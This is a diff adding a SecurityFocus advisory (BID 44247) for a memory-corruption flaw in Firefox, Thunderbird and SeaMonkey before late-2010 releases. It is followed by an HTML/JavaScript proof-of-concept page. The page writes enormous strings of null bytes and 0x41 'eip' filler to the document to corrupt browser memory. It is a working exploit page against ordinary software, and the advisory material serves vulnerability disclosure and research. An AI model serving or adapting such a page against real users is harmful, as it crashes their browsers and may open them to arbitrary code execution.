@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/44247/info
+
+Mozilla Firefox, Thunderbird, and Seamonkey are prone to a memory-corruption vulnerability because they fail to adequately validate user-supplied data.
+
+Successful exploits may allow an attacker to execute arbitrary code in the context of the user running an affected application. Failed exploit attempts will result in a denial-of-service condition.
+
+This issue affects versions prior to:
+
+Firefox 3.6.11
+Firefox 3.5.14
+Thunderbird 3.1.5
+Thunderbird 3.0.9
+SeaMonkey 2.0.9
+
+NOTE: This issue was previously discussed in 44228 (Mozilla Firefox/Thunderbird/SeaMonkey MFSA 2010-64/65/66/67/68/69/71/72 Multiple Vulnerabilities) but has been given its own record to better document it. 
+
+<html>
+<head>
+<script language="JavaScript" type="Text/Javascript">
+    var eip = unescape("%u4141%u4141");
+    var string2 = unescape("%u0000%u0000");
+    var finalstring2 = expand(string2, 49000000);
+    var finaleip = expand(eip, 21000001);
+document.write(finalstring2);
+document.write(finaleip);
+function expand(string, number) {
+    var i = Math.ceil(Math.log(number) / Math.LN2),
+        result = string;
+    do {
+        result += result;
+    } while (0 < --i);
+    return result.slice(0, string.length * number);
+}
+</script>
+</head>
+<body>
+</body>
+</html>
+<html><body></body></html>
+
